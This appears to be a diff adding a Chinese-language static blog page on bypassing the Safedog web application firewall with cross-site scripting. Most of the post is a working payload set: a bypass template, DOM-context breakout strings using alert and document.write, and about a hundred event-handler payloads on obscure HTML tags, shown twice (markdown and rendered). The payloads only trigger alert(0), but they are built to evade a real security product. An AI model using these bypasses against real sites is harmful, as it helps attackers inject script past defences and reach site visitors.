@@ -1,0 +1,365 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+	<h1>
+    <a href="/" id="title"></a>
+	</h1>
+	</div>
+<div id="md" style="display: none;">
+<!-- markdown -->
+## ref-xss
+
+绕过 payload 格式
+
+```
+<[WORD] on[EVENT]=[EVAL]>[TEXT]
+```
+
+在随机单词的标签内加上 on 事件, 最后在标签外加上文本.
+
+因为 html 的松散性, 导致 `<sb>sb</sb>` 都能被解析成标签, 并且支持触发类似于 `onclick` `onmouseover` 的事件
+
+特别小众的标签也可以绕过安全狗的规则, 比如 `acronym` `address`, 翻翻 w3c 的教程能找出好多
+
+## dom-xss
+
+安全狗不存在 dom-xss 的拦截规则
+
+基本上没有尖括号就可以绕过了, 或者使用上面的 payload
+
+由于上下文是在 JavaScript 的环境内, 会有很多的变形
+
+```
+";alert(0);//
+";document.write("\u003cscript\u003ealert(0)\u003c\u002fscript\u003e");//
+```
+
+总之先闭合 然后直接弹窗 or 用 `docment.write` 写标签
+
+## payloads
+
+```
+<a onclick="javascript:alert(0)">a
+<javascript onclick="javascript:alert(0)">a
+<b onclick="javascript:alert(0)">a
+<abbr onclick="javascript:alert(0)">a
+<acronym onclick="javascript:alert(0)">a
+<address onclick="javascript:alert(0)">a
+<applet onclick="javascript:alert(0)">a
+<article onclick="javascript:alert(0)">a
+<xss onclick="javascript:alert(0)">a
+<aside onclick="javascript:alert(0)">a
+<bdi onclick="javascript:alert(0)">a
+<bdo onclick="javascript:alert(0)">a
+<big onclick="javascript:alert(0)">a
+<button onclick="javascript:alert(0)">a
+<del onclick="javascript:alert(0)">a
+<details onclick="javascript:alert(0)">a
+<div onclick="javascript:alert(0)">a
+<dfn onclick="javascript:alert(0)">a
+<dl onclick="javascript:alert(0)">a
+<dt onclick="javascript:alert(0)">a
+<h1 onclick="javascript:alert(0)">a
+<h2 onclick="javascript:alert(0)">a
+<h3 onclick="javascript:alert(0)">a
+<h4 onclick="javascript:alert(0)">a
+<h5 onclick="javascript:alert(0)">a
+<h6 onclick="javascript:alert(0)">a
+<header onclick="javascript:alert(0)">a
+<hr onclick="javascript:alert(0)">a
+<html onclick="javascript:alert(0)">a
+<kbd onclick="javascript:alert(0)">a
+<map onclick="javascript:alert(0)">a
+<mark onclick="javascript:alert(0)">a
+<menu onclick="javascript:alert(0)">a
+<menuitem onclick="javascript:alert(0)">a
+<meter onclick="javascript:alert(0)">a
+<q onclick="javascript:alert(0)">a
+<var onclick="javascript:alert(0)">a
+<xmp onclick="javascript:alert(0)">a
+<addons onclick="javascript:alert(0)">a
+<ascii onclick="javascript:alert(0)">a
+<aspx onclick="javascript:alert(0)">a
+<java onclick="javascript:alert(0)">a
+<mobile onclick="javascript:alert(0)">a
+<go onclick="javascript:alert(0)">a
+<alibaba onclick="javascript:alert(0)">a
+<baidu onclick="javascript:alert(0)">a
+<google onclick="javascript:alert(0)">a
+<github onclick="javascript:alert(0)">a
+<acu onclick="javascript:alert(0)">a
+<mail onclick="javascript:alert(0)">a
+<a onmouseover="javascript:alert(0)">a
+<javascript onmouseover="javascript:alert(0)">a
+<b onmouseover="javascript:alert(0)">a
+<abbr onmouseover="javascript:alert(0)">a
+<acronym onmouseover="javascript:alert(0)">a
+<address onmouseover="javascript:alert(0)">a
+<applet onmouseover="javascript:alert(0)">a
+<article onmouseover="javascript:alert(0)">a
+<xss onmouseover="javascript:alert(0)">a
+<aside onmouseover="javascript:alert(0)">a
+<bdi onmouseover="javascript:alert(0)">a
+<bdo onmouseover="javascript:alert(0)">a
+<big onmouseover="javascript:alert(0)">a
+<button onmouseover="javascript:alert(0)">a
+<del onmouseover="javascript:alert(0)">a
+<details onmouseover="javascript:alert(0)">a
+<div onmouseover="javascript:alert(0)">a
+<dfn onmouseover="javascript:alert(0)">a
+<dl onmouseover="javascript:alert(0)">a
+<dt onmouseover="javascript:alert(0)">a
+<h1 onmouseover="javascript:alert(0)">a
+<h2 onmouseover="javascript:alert(0)">a
+<h3 onmouseover="javascript:alert(0)">a
+<h4 onmouseover="javascript:alert(0)">a
+<h5 onmouseover="javascript:alert(0)">a
+<h6 onmouseover="javascript:alert(0)">a
+<header onmouseover="javascript:alert(0)">a
+<hr onmouseover="javascript:alert(0)">a
+<html onmouseover="javascript:alert(0)">a
+<kbd onmouseover="javascript:alert(0)">a
+<map onmouseover="javascript:alert(0)">a
+<mark onmouseover="javascript:alert(0)">a
+<menu onmouseover="javascript:alert(0)">a
+<menuitem onmouseover="javascript:alert(0)">a
+<meter onmouseover="javascript:alert(0)">a
+<q onmouseover="javascript:alert(0)">a
+<var onmouseover="javascript:alert(0)">a
+<xmp onmouseover="javascript:alert(0)">a
+<addons onmouseover="javascript:alert(0)">a
+<ascii onmouseover="javascript:alert(0)">a
+<aspx onmouseover="javascript:alert(0)">a
+<java onmouseover="javascript:alert(0)">a
+<mobile onmouseover="javascript:alert(0)">a
+<go onmouseover="javascript:alert(0)">a
+<alibaba onmouseover="javascript:alert(0)">a
+<baidu onmouseover="javascript:alert(0)">a
+<google onmouseover="javascript:alert(0)">a
+<github onmouseover="javascript:alert(0)">a
+<acu onmouseover="javascript:alert(0)">a
+<mail onmouseover="javascript:alert(0)">a
+```
+<!-- markdown end -->
+</div>
+<div class="entry" id="main">
+<!-- content -->
+<h2 id="refxss">ref-xss</h2>
+
+<p>绕过 payload 格式</p>
+
+<pre><code>&lt;[WORD] on[EVENT]=[EVAL]&gt;[TEXT]
+</code></pre>
+
+<p>在随机单词的标签内加上 on 事件, 最后在标签外加上文本.</p>
+
+<p>因为 html 的松散性, 导致 <code>&lt;sb&gt;sb&lt;/sb&gt;</code> 都能被解析成标签, 并且支持触发类似于 <code>onclick</code> <code>onmouseover</code> 的事件</p>
+
+<p>特别小众的标签也可以绕过安全狗的规则, 比如 <code>acronym</code> <code>address</code>, 翻翻 w3c 的教程能找出好多</p>
+
+<h2 id="domxss">dom-xss</h2>
+
+<p>安全狗不存在 dom-xss 的拦截规则</p>
+
+<p>基本上没有尖括号就可以绕过了, 或者使用上面的 payload</p>
+
+<p>由于上下文是在 JavaScript 的环境内, 会有很多的变形</p>
+
+<pre><code>";alert(0);//
+";document.write("\u003cscript\u003ealert(0)\u003c\u002fscript\u003e");//
+</code></pre>
+
+<p>总之先闭合 然后直接弹窗 or 用 <code>docment.write</code> 写标签</p>
+
+<h2 id="payloads">payloads</h2>
+
+<pre><code>&lt;a onclick="javascript:alert(0)"&gt;a
+&lt;javascript onclick="javascript:alert(0)"&gt;a
+&lt;b onclick="javascript:alert(0)"&gt;a
+&lt;abbr onclick="javascript:alert(0)"&gt;a
+&lt;acronym onclick="javascript:alert(0)"&gt;a
+&lt;address onclick="javascript:alert(0)"&gt;a
+&lt;applet onclick="javascript:alert(0)"&gt;a
+&lt;article onclick="javascript:alert(0)"&gt;a
+&lt;xss onclick="javascript:alert(0)"&gt;a
+&lt;aside onclick="javascript:alert(0)"&gt;a
+&lt;bdi onclick="javascript:alert(0)"&gt;a
+&lt;bdo onclick="javascript:alert(0)"&gt;a
+&lt;big onclick="javascript:alert(0)"&gt;a
+&lt;button onclick="javascript:alert(0)"&gt;a
+&lt;del onclick="javascript:alert(0)"&gt;a
+&lt;details onclick="javascript:alert(0)"&gt;a
+&lt;div onclick="javascript:alert(0)"&gt;a
+&lt;dfn onclick="javascript:alert(0)"&gt;a
+&lt;dl onclick="javascript:alert(0)"&gt;a
+&lt;dt onclick="javascript:alert(0)"&gt;a
+&lt;h1 onclick="javascript:alert(0)"&gt;a
+&lt;h2 onclick="javascript:alert(0)"&gt;a
+&lt;h3 onclick="javascript:alert(0)"&gt;a
+&lt;h4 onclick="javascript:alert(0)"&gt;a
+&lt;h5 onclick="javascript:alert(0)"&gt;a
+&lt;h6 onclick="javascript:alert(0)"&gt;a
+&lt;header onclick="javascript:alert(0)"&gt;a
+&lt;hr onclick="javascript:alert(0)"&gt;a
+&lt;html onclick="javascript:alert(0)"&gt;a
+&lt;kbd onclick="javascript:alert(0)"&gt;a
+&lt;map onclick="javascript:alert(0)"&gt;a
+&lt;mark onclick="javascript:alert(0)"&gt;a
+&lt;menu onclick="javascript:alert(0)"&gt;a
+&lt;menuitem onclick="javascript:alert(0)"&gt;a
+&lt;meter onclick="javascript:alert(0)"&gt;a
+&lt;q onclick="javascript:alert(0)"&gt;a
+&lt;var onclick="javascript:alert(0)"&gt;a
+&lt;xmp onclick="javascript:alert(0)"&gt;a
+&lt;addons onclick="javascript:alert(0)"&gt;a
+&lt;ascii onclick="javascript:alert(0)"&gt;a
+&lt;aspx onclick="javascript:alert(0)"&gt;a
+&lt;java onclick="javascript:alert(0)"&gt;a
+&lt;mobile onclick="javascript:alert(0)"&gt;a
+&lt;go onclick="javascript:alert(0)"&gt;a
+&lt;alibaba onclick="javascript:alert(0)"&gt;a
+&lt;baidu onclick="javascript:alert(0)"&gt;a
+&lt;google onclick="javascript:alert(0)"&gt;a
+&lt;github onclick="javascript:alert(0)"&gt;a
+&lt;acu onclick="javascript:alert(0)"&gt;a
+&lt;mail onclick="javascript:alert(0)"&gt;a
+&lt;a onmouseover="javascript:alert(0)"&gt;a
+&lt;javascript onmouseover="javascript:alert(0)"&gt;a
+&lt;b onmouseover="javascript:alert(0)"&gt;a
+&lt;abbr onmouseover="javascript:alert(0)"&gt;a
+&lt;acronym onmouseover="javascript:alert(0)"&gt;a
+&lt;address onmouseover="javascript:alert(0)"&gt;a
+&lt;applet onmouseover="javascript:alert(0)"&gt;a
+&lt;article onmouseover="javascript:alert(0)"&gt;a
+&lt;xss onmouseover="javascript:alert(0)"&gt;a
+&lt;aside onmouseover="javascript:alert(0)"&gt;a
+&lt;bdi onmouseover="javascript:alert(0)"&gt;a
+&lt;bdo onmouseover="javascript:alert(0)"&gt;a
+&lt;big onmouseover="javascript:alert(0)"&gt;a
+&lt;button onmouseover="javascript:alert(0)"&gt;a
+&lt;del onmouseover="javascript:alert(0)"&gt;a
+&lt;details onmouseover="javascript:alert(0)"&gt;a
+&lt;div onmouseover="javascript:alert(0)"&gt;a
+&lt;dfn onmouseover="javascript:alert(0)"&gt;a
+&lt;dl onmouseover="javascript:alert(0)"&gt;a
+&lt;dt onmouseover="javascript:alert(0)"&gt;a
+&lt;h1 onmouseover="javascript:alert(0)"&gt;a
+&lt;h2 onmouseover="javascript:alert(0)"&gt;a
+&lt;h3 onmouseover="javascript:alert(0)"&gt;a
+&lt;h4 onmouseover="javascript:alert(0)"&gt;a
+&lt;h5 onmouseover="javascript:alert(0)"&gt;a
+&lt;h6 onmouseover="javascript:alert(0)"&gt;a
+&lt;header onmouseover="javascript:alert(0)"&gt;a
+&lt;hr onmouseover="javascript:alert(0)"&gt;a
+&lt;html onmouseover="javascript:alert(0)"&gt;a
+&lt;kbd onmouseover="javascript:alert(0)"&gt;a
+&lt;map onmouseover="javascript:alert(0)"&gt;a
+&lt;mark onmouseover="javascript:alert(0)"&gt;a
+&lt;menu onmouseover="javascript:alert(0)"&gt;a
+&lt;menuitem onmouseover="javascript:alert(0)"&gt;a
+&lt;meter onmouseover="javascript:alert(0)"&gt;a
+&lt;q onmouseover="javascript:alert(0)"&gt;a
+&lt;var onmouseover="javascript:alert(0)"&gt;a
+&lt;xmp onmouseover="javascript:alert(0)"&gt;a
+&lt;addons onmouseover="javascript:alert(0)"&gt;a
+&lt;ascii onmouseover="javascript:alert(0)"&gt;a
+&lt;aspx onmouseover="javascript:alert(0)"&gt;a
+&lt;java onmouseover="javascript:alert(0)"&gt;a
+&lt;mobile onmouseover="javascript:alert(0)"&gt;a
+&lt;go onmouseover="javascript:alert(0)"&gt;a
+&lt;alibaba onmouseover="javascript:alert(0)"&gt;a
+&lt;baidu onmouseover="javascript:alert(0)"&gt;a
+&lt;google onmouseover="javascript:alert(0)"&gt;a
+&lt;github onmouseover="javascript:alert(0)"&gt;a
+&lt;acu onmouseover="javascript:alert(0)"&gt;a
+&lt;mail onmouseover="javascript:alert(0)"&gt;a
+</code></pre>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2014 by isnowfy, Designed by isnowfy</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "xss-bypass-safedog.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
